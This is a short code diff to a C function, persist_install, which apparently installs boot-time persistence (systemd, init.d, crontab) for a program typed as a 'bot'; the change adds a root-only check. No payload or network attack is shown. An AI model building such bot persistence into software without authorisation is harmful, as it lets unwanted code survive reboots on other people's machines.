@@ -185,6 +185,14 @@ int install_sysv(const char *bin_path) {
 
 /* ── Install Persistence ─────────────────────────────────── */
 int persist_install(notnet_bot_t *bot) {
+    /* SECURITY FIX (#7): Only attempt persistence as root — otherwise
+     * the writes to /etc/systemd/system, /etc/init.d, and crontab will
+     * fail or require dangerous sudo escalation. */
+    if (geteuid() != 0) {
+        log_warn("Persistence: not running as root, skipping (requires privileges)");
+        return -1;
+    }
+
     int detected = detect_init_system();
     
     char bin_path[256];
